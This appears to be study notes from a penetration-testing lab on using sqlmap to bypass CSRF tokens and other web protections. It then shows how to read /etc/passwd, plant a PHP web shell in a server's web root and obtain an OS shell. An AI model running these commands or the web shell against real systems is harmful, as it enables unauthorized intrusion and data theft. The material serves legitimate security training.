-----
# Bypass Web Application Protections
-----
## Anti-CSRF Token Bypass
- `--csrf-token`: sqlmap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
- If one of the provided parameters contains any infixes (csrf, xsrf, token), users will be prompted whether to update it in further requests
```bash
sqlmap -u $URL --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

## Unique Value Bypass
- In some cases, web applications only require unique values to be provided inside the parameters (for similar purpose of anti-CSRF). To ensure we include unique values, we use `--randomize` and points it to the key whose value should be unique.
```bash
sqlmap -U "http://www.example.com/?id=1&rp=29125" --randomize="rp" --batch -v 5 | grep URI
```

## Calculated Parameter Bypass
- Another similar mechanism where parameters' values are calculated by another parameters. IN this case, we use `--eval` flag, together with a Python code's being used before the request is sent.
```bash
sqlmap -U "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

## IP Address Bypass
- We can use `--proxy="socks4://177.39.187.70:33283"` to provide anonymity or the network (or in the event that our IP address is blacklisted)

## Tamper Scripts
- We can use `--tamper=between` to replace all occurrences of greater than operator (>) with `NOT BETWEEN 0 and #` and the equals operator (`=`) with `BETWEEN # AND #`
```bash
sqlmap -u http://157.245.32.216:31030/case11.php?id=1 --batch --dump -D testdb -T flag11 --tamper=between
```
- Use `--list-tampers` to see all options and descriptions.

-----
# OS Exploitation
-----
## File Read/Write
- In MySQL, users must have privilege to `LOAD DATA` and `INSERT`
```mysql
LOAD DTA LOCAL INFILE '/etc/passwd' into TABLE passwd;
```
- Check for DB privileges
```bash
sqlmap -u $URL --is-dba
```

## Read Local Files
- Prerequisite: Must have DBA privileges - `current user is DBA: True`
```mysql
sqlmap -u $URL --file-read "/etc/passwd"
```
- Once the file is saved to PWNBOX, we can view its content
```bash
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```

## Writing Local Files
- `--secure-file-priv` configuration must be manually disabled to allow writing data into local files using the `INTO OUTFILE` SQL query. To test if we can write files to the remote server, use `--file-write` and `--file-dest`.
- First, prepare a shell.php
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
- Write file to */var/www/html/*
```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
- Once the file is uploaded to the shell, we can run the code
```bash
curl http://www.example.com/shell.php?cmd=ls+-la
```

## OS Command Execution
- We can simply get an OS shell by using sqlmap with `--os-shell`
```bash
sqlmap -u $URL?id=1 --os-shell
```
- The default technique is `UNION`. However, it does not always work. In this case, we can try other technique by using `--technique=E` (Error-based)